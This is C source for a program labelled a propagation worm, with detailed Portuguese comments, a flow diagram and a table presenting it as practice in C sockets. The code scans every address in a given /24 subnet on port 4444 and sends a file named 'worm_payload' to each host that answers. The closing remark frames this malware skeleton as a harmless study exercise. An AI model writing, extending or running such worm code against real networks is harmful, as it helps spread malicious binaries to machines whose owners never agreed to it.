```c
// Inclui a biblioteca padrão de entrada e saída.
// É usada por funções como printf(), fopen(), fread(), fclose() e perror().
#include <stdio.h>

// Inclui funções gerais da biblioteca padrão do C.
// Exemplo: funções relacionadas à alocação de memória e conversões.
#include <stdlib.h>

// Inclui funções para manipulação de strings.
// Neste código, é usada indiretamente para trabalhar com strings.
#include <string.h>

// Biblioteca POSIX para funções relacionadas ao sistema Unix/Linux.
// Aqui, close() é utilizada para fechar o socket.
#include <unistd.h>

// Biblioteca para trabalhar com endereços e funções de rede.
// Fornece funções como inet_addr() e htons().
#include <arpa/inet.h>

// Biblioteca principal para criação e utilização de sockets.
#include <sys/socket.h>

// Biblioteca que contém estruturas utilizadas para endereços IPv4,
// incluindo struct sockaddr_in.
#include <netinet/in.h>


// ==============================
// CONFIGURAÇÕES DO PROGRAMA
// ==============================

// Define a porta TCP utilizada pelo programa.
// O valor 4444 será usado posteriormente em TARGET_PORT.
#define TARGET_PORT 4444

// Define o nome do arquivo binário que será aberto pela função
// send_payload().
#define BINARY_NAME "worm_payload"


// ==========================================================
// FUNÇÃO send_payload()
// ==========================================================

// Declara uma função chamada send_payload().
// Ela recebe como parâmetro um socket já criado/conectado.
// "void" significa que a função não retorna nenhum valor.
void send_payload(int sock) {

    // Declara um ponteiro para FILE.
    // Ele será utilizado para representar o arquivo aberto.
    FILE *fp = fopen(BINARY_NAME, "rb");

    // Verifica se fopen() conseguiu abrir o arquivo.
    // NULL significa que a abertura falhou.
    if (fp == NULL) {

        // perror() mostra uma mensagem de erro relacionada
        // ao último erro ocorrido no sistema.
        perror("Erro ao abrir o próprio binário");

        // return encerra imediatamente a função.
        return;
    }

    // Cria um buffer de 1024 bytes.
    // O buffer será utilizado para armazenar temporariamente
    // partes do arquivo.
    char buffer[1024];

    // Declara uma variável para guardar a quantidade de bytes
    // lidos por fread().
    size_t bytes_read;

    // fread() lê dados do arquivo.
    //
    // buffer       -> local onde os dados serão armazenados
    // 1            -> tamanho de cada elemento
    // sizeof(buffer) -> quantidade máxima de elementos lidos
    // fp           -> arquivo que será lido
    //
    // O loop continua enquanto fread() retornar uma quantidade
    // maior que zero.
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {

        // Envia pelo socket os bytes que foram lidos.
        //
        // sock       -> socket utilizado para comunicação
        // buffer     -> dados que serão enviados
        // bytes_read -> quantidade de bytes válidos no buffer
        // 0          -> flags padrão
        send(sock, buffer, bytes_read, 0);
    }

    // Fecha o arquivo depois que a leitura terminou.
    fclose(fp);

    // Exibe uma mensagem informando que a função terminou o envio.
    printf("[+] Payload enviado com sucesso.\n");
}


// ==========================================================
// FUNÇÃO scan_and_infect()
// ==========================================================

// Declara a função responsável pela parte de varredura.
// network_prefix recebe o prefixo da rede em formato de string.
void scan_and_infect(char *network_prefix) {

    // Declara uma variável inteira que armazenará o descritor
    // do socket.
    int sock;

    // Declara uma estrutura sockaddr_in.
    // Essa estrutura guarda informações de um endereço IPv4,
    // como família, porta e endereço IP.
    struct sockaddr_in target_addr;

    // Cria um array de 16 caracteres para armazenar um endereço IPv4
    // no formato de texto.
    //
    // Exemplo:
    // "192.168.1.254"
    char ip[16];


    // Inicia um loop que percorre os números de 1 até 254.
    //
    // int i = 1 -> começa em 1
    // i < 255   -> termina quando chegar a 255
    // i++       -> aumenta 1 a cada repetição
    //
    // Isso permite construir endereços como:
    // 192.168.1.1
    // 192.168.1.2
    // ...
    // 192.168.1.254
    for (int i = 1; i < 255; i++) {

        // Monta o endereço IP combinando:
        //
        // network_prefix -> prefixo recebido
        // i               -> número atual do loop
        //
        // Exemplo:
        // network_prefix = "192.168.1"
        // i = 10
        //
        // Resultado:
        // "192.168.1.10"
        sprintf(ip, "%s.%d", network_prefix, i);

        // Mostra no terminal qual endereço está sendo processado.
        printf("[*] Tentando infectar: %s\n", ip);


        // Cria um socket.
        //
        // AF_INET     -> utiliza IPv4
        // SOCK_STREAM -> socket orientado a conexão, normalmente TCP
        // 0           -> utiliza o protocolo padrão correspondente
        sock = socket(AF_INET, SOCK_STREAM, 0);


        // Declara uma estrutura timeval para configurar
        // o tempo limite de uma operação.
        struct timeval timeout;

        // Define a quantidade de segundos do timeout.
        // Neste caso, 1 segundo.
        timeout.tv_sec = 1;

        // Define os microssegundos adicionais.
        // 0 significa nenhum microssegundo adicional.
        timeout.tv_usec = 0;


        // Configura uma opção do socket.
        //
        // sock              -> socket que será configurado
        // SOL_SOCKET        -> opções pertencentes ao próprio socket
        // SO_SNDTIMEO       -> timeout relacionado ao envio
        // (char *)&timeout  -> endereço da estrutura timeout
        // sizeof(timeout)   -> tamanho da estrutura
        setsockopt(
            sock,
            SOL_SOCKET,
            SO_SNDTIMEO,
            (char *)&timeout,
            sizeof(timeout)
        );


        // Define que o endereço utiliza IPv4.
        target_addr.sin_family = AF_INET;

        // Define a porta de destino.
        //
        // TARGET_PORT possui o valor 4444.
        //
        // htons() converte o número para a representação
        // utilizada pela rede.
        target_addr.sin_port = htons(TARGET_PORT);

        // Converte o endereço IP que está em texto para
        // um valor numérico utilizado pela estrutura de rede.
        //
        // Exemplo:
        // "192.168.1.10"
        //
        // vira uma representação adequada para o socket.
        target_addr.sin_addr.s_addr = inet_addr(ip);


        // Tenta estabelecer uma conexão TCP com o endereço
        // armazenado em target_addr.
        //
        // connect() retorna 0 quando a conexão é estabelecida.
        if (
            connect(
                sock,
                (struct sockaddr *)&target_addr,
                sizeof(target_addr)
            ) == 0
        ) {

            // Exibe uma mensagem indicando que a conexão
            // foi estabelecida.
            printf("[!] Alvo vulnerável encontrado: %s\n", ip);

            // Chama a função responsável pela transferência
            // do conteúdo de BINARY_NAME através do socket.
            send_payload(sock);
        }


        // Fecha o socket utilizado nessa tentativa.
        // Isso libera o recurso depois que a conexão terminou.
        close(sock);
    }
}


// ==========================================================
// FUNÇÃO main()
// ==========================================================

// Ponto inicial de execução do programa.
//
// argc -> quantidade de argumentos recebidos
// argv -> array contendo os argumentos
int main(int argc, char *argv[]) {

    // Verifica se foi fornecido pelo menos um argumento
    // além do nome do próprio programa.
    //
    // argv[0] normalmente contém o nome do programa.
    // Portanto, argc precisa ser pelo menos 2.
    if (argc < 2) {

        // Mostra como o programa deve ser chamado.
        //
        // %s será substituído pelo nome armazenado em argv[0].
        printf(
            "Uso: %s <prefixo_da_rede> (ex: 192.168.1)\n",
            argv[0]
        );

        // Retorna 1 para indicar que houve erro no uso
        // dos argumentos.
        return 1;
    }


    // Mostra uma mensagem indicando o início da execução.
    printf("--- Iniciando Worm de Propagação ---\n");


    // ======================================================
    // PAYLOAD LOCAL
    // ======================================================

    // Mostra uma mensagem indicando que a etapa de payload
    // local foi iniciada.
    printf("[+] Executando payload local...\n");


    // ======================================================
    // PROPAGAÇÃO
    // ======================================================

    // Chama scan_and_infect().
    //
    // argv[1] contém o primeiro argumento fornecido pelo usuário.
    //
    // Exemplo conceitual:
    // argv[1] = "192.168.1"
    //
    // A função utilizará esse prefixo para construir os
    // endereços durante o loop.
    scan_and_infect(argv[1]);


    // Mostra uma mensagem indicando o término da etapa
    // de propagação.
    printf("--- Ciclo de propagação concluído ---\n");


    // Retorna 0 para indicar que o programa terminou
    // normalmente.
    return 0;
}
```

### 🧠 Resumo das partes principais

```text
main()
 │
 ├── verifica os argumentos
 │
 ├── mostra início
 │
 └── chama scan_and_infect()
          │
          ├── cria IP
          ├── cria socket
          ├── configura endereço
          ├── tenta connect()
          │
          └── se conectar
                 │
                 └── send_payload()
                        │
                        ├── fopen()
                        ├── fread()
                        └── send()
```

### 📌 O que você está praticando em C

| Função/conceito | O que você aprende |
|---|---|
| `fopen()` | Abrir arquivo |
| `fread()` | Ler arquivo |
| `fclose()` | Fechar arquivo |
| `socket()` | Criar socket |
| `setsockopt()` | Configurar socket |
| `connect()` | Estabelecer conexão |
| `send()` | Enviar dados |
| `close()` | Fechar socket |
| `struct sockaddr_in` | Representar endereço IPv4 |
| `inet_addr()` | Converter IP |
| `htons()` | Converter porta para ordem de rede |
| `sprintf()` | Montar uma string |
| `for` | Repetir a varredura |
| `argc/argv` | Receber argumentos do terminal |
```

Esse código é especialmente útil para você estudar **C + Linux + sockets + redes**, porque praticamente cada etapa envolve uma API diferente.
